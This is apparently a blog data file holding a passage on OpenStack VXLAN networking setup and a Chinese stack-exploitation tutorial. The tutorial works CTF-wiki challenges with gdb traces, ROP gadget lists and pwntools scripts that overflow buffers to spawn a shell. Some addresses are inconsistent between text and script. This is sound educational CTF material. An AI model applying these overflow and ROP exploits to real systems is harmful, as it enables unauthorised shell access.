=mechanism_drivers = linuxbridge# 为type_drivers = flat,vlan,vxlantenant_network_types = vxlanmechanism_drivers = linuxbridge,l2population# 增加一个新配置段 ml2_type_vxlan 并增加下面内容# 这个配置是vxlan的范围,官网文档是1:1000,我这里写的是10000,建议大点[ml2_type_vxlan]vni_ranges = 1:10000\n下面修改linuxbridge的配置，修改/etc/neutron/plugins/ml2/linuxbridge_agent.ini文件，主要内容如下\n# vxlan段，默认就一条禁用的配置，修改成下面内容[vxlan]enable_vxlan = truelocal_ip = 172.16.0.11l2_population = true\n需要注意的是local_ip这个参数，这个参数需要写新增网卡的ip下面开始编辑l3 agent的配置,配置文件/etc/neutron/l3_agent.ini,下面开始备份\ncp /etc/neutron/l3_agent.ini&#123;,.bak&#125;egrep -v &quot;^$|^#&quot; /etc/neutron/l3_agent.ini.bak &gt; /etc/neutron/l3_agent.ini\n编辑，主要内容如下\n[DEFAULT]interface_driver = linuxbridge\n重启服务\nsystemctl restart neutron-server neutron-linuxbridge-agent neutron-dhcp-agent neutron-metadata-agentsystemctl enable --now neutron-l3-agent.service\n下面开始配置neutron计算网络节点，计算网络节点比较简单只需要修改/etc/neutron/plugins/ml2/linuxbridge_agent.ini文件即可，主要修改内容为\n# 修改[vxlan]enable_vxlan = false# 为[vxlan]enable_vxlan = truelocal_ip = 172.16.0.31l2_population = true\n重启服务\nsystemctl restart neutron-linuxbridge-agent\n配置好网络组件后还需要去配置仪表盘组件的配置，编辑/etc/openstack-dashboard/local_settings文件，主要修改内容如下\nOPENSTACK_NEUTRON_NETWORK = &#123;    &#x27;enable_router&#x27;: True,    ......&#125;\n把仪表的路由器功能打开。全部配置好后需要在仪表中的管理员-》网络-》网络中配置，在创建自助网络的时候就必须有一个外部网络，在之前的provider是已经创建好了，如果没有则需要再创建一个外部网络这个网络就是出口，后续创建的所有网络都可以通过他来做nat上网，在项目-》网络-》网络中创建一个VPC网络，具体操作如下子网的创建，网络地址可以随便写，网关要写网络中的第一位可用地址。创建好子网之后再去创建一个路由与外部网络绑定，在项目-》网络-》路由中新建一个路由，可参考下图建好点进去增加一个接口此时，通过test网络创建的主机都可以通过这个路由上网，尝试结果如下因为是内部的VPC网络所以外部无法直接访问，可以通过关联浮动ip的形式来实现外部访问，在管理员-》网络-》浮动IP-》分配IP给项目中创建一个浮动ip资源池就是外部网络，浮动ip地址就是外部的地址，不写就是dhcp，再通过项目-》计算-》实例绑定浮动ip即可通过分配的10.0.0.202去访问主机。\n通信过程参考： https://www.bilibili.com/video/BV1Mm411U7jM\n总结OpenStack会为每个租户创建一个Vxlan设备进行通信OpenStack中虚拟路由器vRouter是通过网络名称空间和iptables来实现的计算节点上虚拟机想要访问外部，需要通过vxlan隧道网络把流量走到网络的控制节点，通过网络控制节点来访问internet。所以如果网络控制节点宕机的话，计算节点上的虚拟机是无法访问外部的。\n供应商网络结构供应商网络的结构图如下，不需要嵌套路由而是在网络名称空间中在物理接口桥接出来一个，然后通过内部dhcp分配ip，直接与外部通信\nVXLAN网络结构vxlan网络结构图如下，每套路由的情况是这样的，如果是套了一层路由，并且出口是物理交换机GW的话，则下图的控制节点的172.16.2.254-qrouter最流量会被发到192.168.137.169-qrouter来处理，浮动ip也是要先经过物理接口ens33的。\n","categories":["虚拟化平台"],"tags":["开源工具","OpenStack","Stein","VXLAN","FLAT"]},{"title":"PWN-栈系列总结","url":"/2025/05/11/PWN-%E6%A0%88%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/","content":"栈基础知识栈基础概念栈是程序运行时的一块区域，主要用于存储临时数据、管理函数调用和返回地址。他有很多的特点，他是一种后进先出的数据结构，操作主要有压栈与出栈两种，并且在程序的内存中他的数据是从高地址往低地址走的。简单说，就是程序运行时的“临时记事本”。\n栈顶与栈底对于栈有两个比较重要的寄存器，一个是栈顶一个是栈顶，在32位操作系统中，寄存器EBP表示栈底，ESP表示栈顶。栈底代表当前栈的最开始的位置，栈顶很好理解，就是栈的最顶部，在操作栈的时候主要分为压栈和出栈，具体是下面两个汇编指令\npush ebx  # 压栈，ebx的数据压入栈顶，并且ESP(栈顶) + sizepop edx   # 出栈，将栈顶数据放置到edx中，并且ESP(栈顶) - size \n具体参考图如下\n这两个操作都是基于栈顶的位置进行操作，并且操作的时候会修改栈顶(ESP)的指向位置。\n函数调用过程上面说栈主要是用来存储临时数据、管理函数调用和返回地址，可以参考下面程序的调用过程\nint sum(int a, int b)&#123;    return a + b;&#125;int main()&#123;    int a = 1;    int b = 2;    int c = sum(a, b);    return 0;&#125;\n使用下面命令编译出32位可执行程序\ngcc -m32 -S -fno-asynchronous-unwind-tables -masm=intel main.c -o main.asm\n通过IDA可以拿到下面汇编指令\n\t.file\t&quot;main.c&quot;\t.intel_syntax noprefix\t.text\t.globl\tsum\t.type\tsum, @functionsum:\tpush\tebp\tmov\tebp, esp\tcall\t__x86.get_pc_thunk.ax\tadd\teax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_\tmov\tedx, DWORD PTR 8[ebp]\tmov\teax, DWORD PTR 12[ebp]\tadd\teax, edx\tpop\tebp\tret\t.size\tsum, .-sum\t.globl\tmain\t.type\tmain, @functionmain:\tpush\tebp\tmov\tebp, esp\tsub\tesp, 16\tcall\t__x86.get_pc_thunk.ax\tadd\teax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_\tmov\tDWORD PTR -4[ebp], 1\tmov\tDWORD PTR -8[ebp], 2\tpush\tDWORD PTR -8[ebp]\tpush\tDWORD PTR -4[ebp]\tcall\tsum\tadd\tesp, 8\tmov\tDWORD PTR -12[ebp], eax\tmov\teax, 0\tleave\tret\t.size\tmain, .-main\t.section\t.text.__x86.get_pc_thunk.ax,&quot;axG&quot;,@progbits,__x86.get_pc_thunk.ax,comdat\t.globl\t__x86.get_pc_thunk.ax\t.hidden\t__x86.get_pc_thunk.ax\t.type\t__x86.get_pc_thunk.ax, @function__x86.get_pc_thunk.ax:\tmov\teax, DWORD PTR [esp]\tret\t.ident\t&quot;GCC: (Debian 14.2.0-19) 14.2.0&quot;\t.section\t.note.GNU-stack,&quot;&quot;,@progbits\n对于当前学习的栈来说，还不需要过度的去解读汇编指令，比较重要的部分主要是main函数的下面指令\nmain:\tpush\tebp\tmov\tebp, esp\t......\tcall\tsum\tadd\tesp, 8\t......\tpop\tebp\tret\n还有sum函数的下面指令\nsum:\tpush\tebp\tmov\tebp, esp\t......\tpop\trbp\tret\nC语言函数被编译之后起初的两个汇编指令都会是下面两条指令来初始化自己的栈\npush\tebpmov\tebp, esp\npush ebp即把EBP压入当前的栈中，mov ebp,esp把当前的esp(栈顶)当作当前函数的ebp(栈底)，这一步的作用是给当前函数基于当前栈数据高一块新的栈位置，即栈内数据是当前函数的，做一个分割。在main函数中，最初的寄存器都是由系统基于函数调用约定自动给布局的，所以当前可以先不在意这一部分，重点看main的call指令，他这里调用了sum函数，实际是干了两个事情，他会把当前的EIP寄存器压入栈顶，然后把EIP寄存器指向sum函数的地址，其中EIP的作用是当前命令执行的位置，call指令执行前之前可以参考下图进入sum函数之后先初始化栈去执行push ebp和mov ebp,esp，具体参考图如下执行过后的栈内容除了上一个函数的栈底之外已经没有内容了，当前栈中的内容全部都是当前函数的一个栈数据区域。我们继续看执行pop ebp和ret干了什么，如下图pop ebp恢复了父函数main的rbp，ret恢复了父函数call之后的eip即运行指针。后续就是main函数结束运行了。对于栈漏洞主要是围绕上面操作进行的，尤其是ret指令，需要深入的理解这一个过程。\n系统防护这一部分可以先跳过，直接去看简单栈溢出，这里是对系统防护我自己的一些总结和思考，在下面章节做题遇到防护可以返回当前板块查看。\nNX防护NX防护，全称The No-eXecute bits，程序与操作系统的防护措施，编译时决定是否生效，由操作系统实现。它通过在内存页的标识中增加“执行”位，可以表示该内存页是否可以执行，若程序代码的EIP执行至不可运行的内存页，则CPU将直接拒绝执行“命令”造成程序崩溃。大白话就是在程序运行的时候，哪些位置可以执行，哪些不可以执行都给标注好了，如果这个开启的话那么一般就不会出现通过自己构造shellcode到内存中执行。典型题目ret2shellcode，他的这个防护是没有开启的，并且这道题目还对内核有要求。如果在用gcc编译程序的时候想要关闭nx防护可以添加参数-z execstack。\nASLR防护全称Address Space Layout Randomization，系统的防护措施，他的主要作用是随机化内存中的地址，一个程序，运行多次，某个内容每一次运行的内存地址都不相同，程序装载时生效。默认系统中应该是开启的，具体验证方式如下查看系统文件/proc/sys/kernel/randomize_va_space，如果是0则就是没有随机化的，也就是ASLR是关闭状态。如果是1，那么就是保留的随机化，他的共享库、栈、mmap()、以及VDSO将被随机化。如果等于2，那么就是完全的随机化，在保留的随机化(状态为1时)的基础上，通过br()分配的内存空间也将被随机化。\n为什么开启了ASLR有些地址还是可以直接使用？在启用了 ASLR（地址空间布局随机化）的系统中，不同的内存区域会受到不同程度的随机化影响。其中会直接受到ASLR的影响的如下\n栈、堆、共享库\n受ASLR影响较小的内存区域，相对稳定不会更变地址的如下\nplt表、got表、代码段(text段)、全局变量(data段)、静态数据段(bss段)、TLS\nPIE防护PIE防护主要是给EIF到内存加载过程中，bss、text、data这些段的随机化，如果PIE开启的话这些的地址也会被随机化。\nPIE与ASLR的关系ASLR 随机的是加载地址，它需要 PIE 的配合才能让 .text&#x2F;.data&#x2F;.bss 被随机，如果程序不是 PIE，text 是固定的，不会被 ASLR 动PIE 是编译出来的位置无关代码，它只是让 ASLR 能够生效在主程序段上（包括 text&#x2F;bss&#x2F;data）然后libc中内置的函数本身就是PIE的，他们编译都会带着个东西。\n简单栈溢出栈溢出漏洞在上面可以了解到在函数调用之后需要通过ret修改EIP寄存器，EIP这个寄存器非常重要，他指向的内容就是他后续执行的命令，在栈中如果可以通过某些办法修改ret的返回地址，就可以做到控制程序执行流的效果。栈溢出是指在一个程序中，本身栈可能就只有10空间的大小，而通过函数读取数据的时候读入了大于10的数据量就会产生栈溢出，如果溢出的位置达到了ret的返回地址那么我们就可以实现上述的控制执行流的效果。加单举个栈溢出的例子，代码如下\n#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main()&#123;    char a[10];    int b = 0;    read(0, a, 11);    if (b)    &#123;        printf(&quot;栈溢出成功\\n&quot;);    &#125;    return 0;&#125;\n这里向里面输入11个1或者10个1都会输出栈溢出成功，输入10个也可以成功的原因是因为发送时回车也会占用空间，所以10个数据也会造成栈溢出，正常来说b应该是0即false，就不会进行输出，这里通过读取11个字符到a变量中发生栈溢出修改b为非零即true，触发if进行输出。\n(pwn) ┌──(root㉿BoyChaiWindows)-[/mnt/e/CTF例题/PWN/总结/栈溢出]└─# ./main1111111111栈溢出成功\n后面会看几道相关的例题分别是ret2text、ret2shellcode、ret2syscall。\nROP-导向编程目前被广泛使用的攻击手法是 返回导向编程 (Return Oriented Programming)，其主要思想是在 栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。后续基本都是围绕着这个攻击手法进行，通过一次修改ret的地址控制整个的执行流程。\nret2text题目来源下载位置： https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2textPS：内容来自于CTF-WIKI\n文件类型┌──(kali㉿kali)-[~/Desktop/pwn]└─$ file ret2textret2text: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped\n程序类型位32位ELF文件\n防护措施┌──(kali㉿kali)-[~/Desktop/pwn]└─$ checksec --file=ret2textRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILEPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   83 Symbols        No    0               2               ret2text\n防护措施好像就有个NX，NX是不允许在堆栈中执行shellcode\nIDA分析main函数内容如下\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[100]; // [esp+1Ch] [ebp-64h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(_bss_start, 0, 1, 0);  puts(&quot;There is something amazing here, do you know anything?&quot;);  gets(s);  printf(&quot;Maybe I will tell you next time !&quot;);  return 0;&#125;\n可以看到gets往s里面传值了，但是s的长度是100，这里就是一个简单的栈溢出。之后还找到了一个程序后门，代码内容如下\nvoid secure()&#123;  unsigned int v0; // eax  int input; // [esp+18h] [ebp-10h] BYREF  int secretcode; // [esp+1Ch] [ebp-Ch]  v0 = time(0);  srand(v0);  secretcode = rand();  __isoc99_scanf((int)&amp;unk_8048760, (int)&amp;input);  if ( input == secretcode )    system(&quot;/bin/sh&quot;);&#125;\n关于system(/bin/sh)他就是留下的后门。。这里看一下他的详细信息\n.text:0804863A ; 11:     system(&quot;/bin/sh&quot;);\n他的地址是0804863A。\n攻击思路使用栈溢出把程序结束时的返回地址改成后门的执行地址也就是0804863A，但是栈需要溢出多少位还不知道需要动态分析一下。\n溢出长度这里通过gdb动态调试来去看溢出长度\n┌──(kali㉿kali)-[~/Desktop/pwn]└─$ gdb ret2textpwndbg&gt; b mainpwndbg&gt; rpwndbg&gt; npwndbg&gt; npwndbg&gt; nhello25      in ret2text.cLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────*EAX  0xffffcf1c ◂— &#x27;hello&#x27; EBX  0xf7e23e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* &#x27;,=&quot;&#x27; */*ECX  0xf7e258ac (_IO_stdfile_0_lock) ◂— 0 EDX  0 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0 ESI  0x80486d0 (__libc_csu_init) ◂— push ebp EBP  0xffffcf88 ◂— 0 ESP  0xffffcf00 —▸ 0xffffcf1c ◂— &#x27;hello&#x27;*EIP  0x80486b3 (main+107) ◂— mov dword ptr [esp], 0x80487a4─────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────────────────────────────────  ......─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────......───────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────── ......────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; \n这里只写一些重要的操作和一些重要输出，输出中重点内容是\n*EAX  0xffffcf1c ◂— &#x27;hello&#x27; EBX  0xf7e23e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* &#x27;,=&quot;&#x27; */*ECX  0xf7e258ac (_IO_stdfile_0_lock) ◂— 0 EDX  0 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0 ESI  0x80486d0 (__libc_csu_init) ◂— push ebp EBP  0xffffcf88 ◂— 0 ESP  0xffffcf00 —▸ 0xffffcf1c ◂— &#x27;hello&#x27;*EIP  0x80486b3 (main+107) ◂— mov dword ptr [esp], 0x80487a4\nEBP和ESP的地址间隔是0xffffcf88 - 0xffffcf1c&#x3D; 4294954888 - 4294954780 &#x3D; 108(这里可以直接用88h-1ch初学为了好理解就写全了)，拿到间隔长度之后需要+4，因为要往返回地址中写内容，而返回地址的位置是再esp 的上面所以需要+4。\n============================\t\t\t返回地址============================\t\t\t%esp============================\t\t\txxxxx============================\n代码攻击from pwn import *io = process(&quot;./ret2text&quot;)target = 0x804863apayload = b&quot;A&quot; * (108 + 4) + p32(target)io.sendline(payload)io.interactive()io.close()\n效果展示\n┌──(kali㉿kali)-[~/Desktop/pwn]└─$ python test.py [+] Starting local process &#x27;./ret2text&#x27;: pid 35232[*] Switching to interactive modeThere is something amazing here, do you know anything?Maybe I will tell you next time !$ lscore  ret2text    run  test.py$ pwd/home/kali/Desktop/pwn$ exit[*] Got EOF while reading in interactive$ [*] Process &#x27;./ret2text&#x27; stopped with exit code -11 (SIGSEGV) (pid 35232)[*] Got EOF while sending in interactive\n\nret2shellcode题目来源下载位置： https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcodePS：内容来自于CTF-WIKI\n关于环境高版本的linux内核似乎已经修复了这个问题，目前只能尝试在Ubuntu-18.04或之前的版本可以 内核版本目前我用的是5.4.0-84-generic成功复现了这个题目。\n文件类型┌──(kali㉿kali)-[~/Desktop/pwn]└─$ file ret2shellcoderet2shellcode: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=47e6d638fe0f3a3ff4695edb8b6c7e83461df949, with debug_info, not stripped\n保护措施┌──(kali㉿kali)-[~/Desktop/pwn]└─$ checksec --file=ret2shellcodeRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\tSymbols\t\tFORTIFY\tFortified\tFortifiable\tFILE\nNX是关闭的，这一题考点就和这个有关系。\nIDA分析main函数内容如下\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[100]; // [esp+1Ch] [ebp-64h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&quot;No system for you this time !!!&quot;);  gets(s);  strncpy(buf2, s, 0x64u);  printf(&quot;bye bye ~&quot;);  return 0;&#125;\nmain中有大问题，gets就不说了，攻击点就肯定是在这里，然后他往一个s[100]输入值了之后把s的值全部放到了buf2中，这个buf2在main中也没有定义，去看一下他的位置\n.bss:0804A080                               public buf2.bss:0804A080                               ; char buf2[100].bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+buf2 db 64h dup(?)                      ; DATA XREF: main+7B↑o.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+_bss ends.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+\n他的地址是0x0804A080这里还是在bss段中的，这里的值是可以读写的。这里思路已经清晰了。\n攻击思路这里面没有发现什么后门，这里我们就需要自己制造出一个后门sh,通过把后门sh写入到buf2中，然后用栈溢出把返回地址修改成buf2就可以完成攻击。\n溢出长度这里通过gdb动态调试来去看溢出长度\npwndbg&gt; nhello      15\tin ret2shellcode.cLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────*EAX  0xffffd29c ◂— &#x27;hello&#x27; EBX  0xf7e23e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* &#x27;,=&quot;&#x27; */*ECX  0xf7e258ac (_IO_stdfile_0_lock) ◂— 0 EDX  0 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0 ESI  0x80485d0 (__libc_csu_init) ◂— push ebp EBP  0xffffd308 ◂— 0 ESP  0xffffd280 —▸ 0xffffd29c ◂— &#x27;hello&#x27;*EIP  0x8048598 (main+107) ◂— mov dword ptr [esp + 8], 0x64\nesp地址是0xffffd29c然后ebp地址是0xffffd308进行计算776-668&#x3D;108,需要溢出的栈长度是108+4，然后再加上返回地址改成buf2那就是116。\n脚本攻击from pwn import *# 远程连接io = remote(&quot;172.20.10.4&quot;,16000)# buf2地址buf2 = 0x0804A080# payload构建# 这里payload的总长度是116payload = asm(shellcraft.sh()).ljust(112,b&quot;a&quot;) + p32(buf2)io.sendline(payload)# 进入交互模式io.interactive()\nret2syscall题目来源下载位置： https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/ropPS：内容来自于CTF-WIKI\n文件类型┌──(kali㉿kali)-[~/Desktop/pwn]└─$ file rop    rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped\n32位ELF文件\n软件防护┌──(kali㉿kali)-[~/Desktop/pwn]└─$ checksec --file=rop  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILEPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   2255 Symbols      No    0               0               rop\n栈溢出防护是关闭的，NX是开启的，那这道题基本上就是用ROP进行栈溢出了。\nIDA分析main函数如下\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [esp+1Ch] [ebp-64h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;);  puts(&quot;What do you plan to do?&quot;);  gets(&amp;v4);  return 0;&#125;\n说这次没有system()和shellcode该怎么办，但是这里有gets函数肯定存在栈溢出，然后分析了一下，确实是没有system()，shellcode也没办法执行，但是在地址0x080BE408发现了字符串&quot;/bin/sh&quot;\n攻击思路shellcode和后门函数都不存在，这里直接尝试rop。\nROPgadget查询┌──(kali㉿kali)-[~/Desktop/pwn]└─$ ROPgadget --binary ./rop --only &quot;pop|ret&quot;|grep eax    0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret0x080bb196 : pop eax ; ret0x0807217a : pop eax ; ret 0x80e0x0804f704 : pop eax ; ret 30x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret\neax_ret &#x3D; 0x080bb196\n┌──(kali㉿kali)-[~/Desktop/pwn]└─$ ROPgadget --binary ./rop --only &quot;pop|ret&quot;|grep ebx0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret0x080be23f : pop ebx ; pop edi ; ret0x0806eb69 : pop ebx ; pop edx ; ret0x08092258 : pop ebx ; pop esi ; pop ebp ; ret0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x100x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x140x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 40x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 80x08048913 : pop ebx ; pop esi ; pop edi ; ret0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 40x08049a94 : pop ebx ; pop esi ; ret0x080481c9 : pop ebx ; ret0x080d7d3c : pop ebx ; ret 0x6f90x08099c87 : pop ebx ; ret 80x0806eb91 : pop ecx ; pop ebx ; ret0x0806336b : pop edi ; pop esi ; pop ebx ; ret0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret0x0805c820 : pop esi ; pop ebx ; ret0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x0807b6ed : pop ss ; pop ebx ; ret\nedx_ecx_ebx_ret &#x3D; 0x0806eb90\n┌──(kali㉿kali)-[~/Desktop/pwn]└─$ ROPgadget --binary ./rop |grep &quot;int&quot;|grep &quot;0x80&quot;...0x08049421 : int 0x80...\nintx80 &#x3D; 0x08049421\n溢出长度这里通过gdb动态调试来去看溢出长度\n*EAX  0xffffcf7c ◂— &#x27;hello&#x27; EBX  0x80481a8 (_init) ◂— push ebx*ECX  0xfbad2288*EDX  0x80eb4e0 (_IO_stdfile_0_lock) ◂— 0 EDI  0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8067b10 (__stpcpy_sse2) ◂— mov edx, dword ptr [esp + 4] ESI  0 EBP  0xffffcfe8 —▸ 0x8049630 (__libc_csu_fini) ◂— push ebx ESP  0xffffcf60 —▸ 0xffffcf7c ◂— &#x27;hello&#x27;*EIP  0x8048e9b (main+119) ◂— mov eax, 0\n0xe8-0x7c&#x3D;232-124&#x3D;108+4&#x3D;112\n攻击脚本from pwn import *io = process(&quot;./rop&quot;)sh = 0x080BE408eax_ret = 0x080BB196edx_ecx_ebx_ret = 0x0806EB90intx80 = 0x08049421payload = flat(    [        b&quot;a&quot; * 112,        eax_ret,        0xB,        edx_ecx_ebx_ret,        0,        0,        sh,        intx80,    ])io.sendline(payload)io.interactive()\n上面四个地址分别是“&#x2F;bin&#x2F;sh”字符串地址、pop eax ret地址、pop ebx ecx edx ret地址、int 0x80地址，使用上面的payload可以达成下面执行效果\nmov eax,0xbmov ebx, [&quot;/bin/sh&quot;]mov ecx, 0mov edx, 0int 0x80\npayload中的0xb是系统调用的id他代表执行命令的一个函数。\nplt与got在编译程序的时候一般都是采用动态链接库的方式去编译，有些函数都是直接调用系统本地的libc，不把这些通用的函数编译进程序中，在采用动态链接库的程序里，如果是需要调用链接库的函数都会在plt和got表中存在一个条数据，plt会指向got表，got最终指向真正在系统中的函数地址，程序在最开始的时候plt和got是有连接的，但是如果函数一次都没被调用那么got表将会是空的，在第一次调用的时候got表才会真正指向内存中的对应函数地址，所以在ROP构造的时候对于这种采用动态链接库的程序可以通过调用对应函数的plt或者调用got地址存储的对应地址来执行相应的函数。需要注意的是动态链接库都是通过系统加载的，真正的函数地址肯定是不固定的，每次启动都会有不同的偏移，想要利用需要知道对应的函数偏移，在一个静态的glibc文件，里面的函数布局除了在加载的偏移不同之外其他的只要版本相同其他都是相同的。\nret2libc1题目来源下载位置： https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1PS：内容来自于CTF-WIKI\n文件类型┌──(kali㉿kali)-[~/Desktop/pwn]└─$ file ret2libc1     ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped\n这是一个采用动态连接库编译的32位ELF文件\n软件防护 checksec --file=ret2libc1    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILEPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   84 Symbols        No    0               1               ret2libc1\n允许栈溢出，NX防护开启，PIE防护关闭。\nIDA分析在main函数中内容如下\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[100]; // [esp+1Ch] [ebp-64h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(_bss_start, 0, 1, 0);  puts(&quot;RET2LIBC &gt;_&lt;&quot;);  gets(s);  return 0;&#125;\n在main中明显的gets函数，直接可以栈溢出，之后其他没有可用信息了。在secure函数中内容如下\nvoid secure()&#123;  unsigned int v0; // eax  int input; // [esp+18h] [ebp-10h] BYREF  int secretcode; // [esp+1Ch] [ebp-Ch]  v0 = time(0);  srand(v0);  secretcode = rand();  __isoc99_scanf(&quot;%d&quot;, &amp;input);  if ( input == secretcode )    system(&quot;shell!?&quot;);&#125;\n有后门，但是system()函数传参不对不能直接拿这个地址直接用。在IDA中查询找字符串/bin/sh在rodata中地址是0x08048720在plt表中查询到system()函数的地址是0x08048460。\n.plt:08048460                               ; [00000006 BYTES: COLLAPSED FUNCTION _system]\n攻击思路采用system的plt地址来运行system()函数，通过程序内的字符串/bin/sh给函数进行传参。\n溢出长度这里通过gdb动态调试来去看溢出长度\n───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────*EAX  0xffffcf3c ◂— &#x27;hello&#x27; EBX  0xf7e23e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* &#x27;,=&quot;&#x27; */*ECX  0xf7e258ac (_IO_stdfile_0_lock) ◂— 0 EDX  0 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0 ESI  0x8048690 (__libc_csu_init) ◂— push ebp EBP  0xffffcfa8 ◂— 0 ESP  0xffffcf20 —▸ 0xffffcf3c ◂— &#x27;hello&#x27;*EIP  0x8048683 (main+107) ◂— mov eax, 0\n这里溢出位数应该是0xa8-0x3c&#x3D;108，溢出位数应该还要+4，+4才是真正返回地址的位置。\n攻击脚本from pwn import *# 利用地址system_plt = 0x8048460binsh = 0x8049720io = process(&quot;./ret2libc1&quot;)payload = flat([b&quot;a&quot; * 112, system_plt, b&quot;b&quot; * 4, binsh])io.sendline(payload)io.interactive()\n在脚本中plt地址后门还要再多溢出4字节，因为函数拿参数的时候都是他的上上个位置，上一个位置也就是这后面填充的4字节，他一般都是返回地址的位置，因为这里只需要执行system()所以不需要考虑这个返回地址的内容，填充垃圾数据即可。\nret2libc2题目来源下载位置： https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2PS：内容来自于CTF-WIKI\n文件类型┌──(root㉿Kali)-[~/Desktop/PWN/ret2libc2]└─# file ret2libc2ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped\n这是一个采用动态连接库编译的32位ELF文件\n软件防护┌──(root㉿Kali)-[~/Desktop/PWN/ret2libc2]└─# checksec ret2libc2[*] &#x27;/root/Desktop/PWN/ret2libc2/ret2libc2&#x27;    Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x8048000)    Stripped:   No    Debuginfo:  Yes\n允许栈溢出，NX防护开启，PIE防护关闭\nIDA分析main函数内容如下\nint 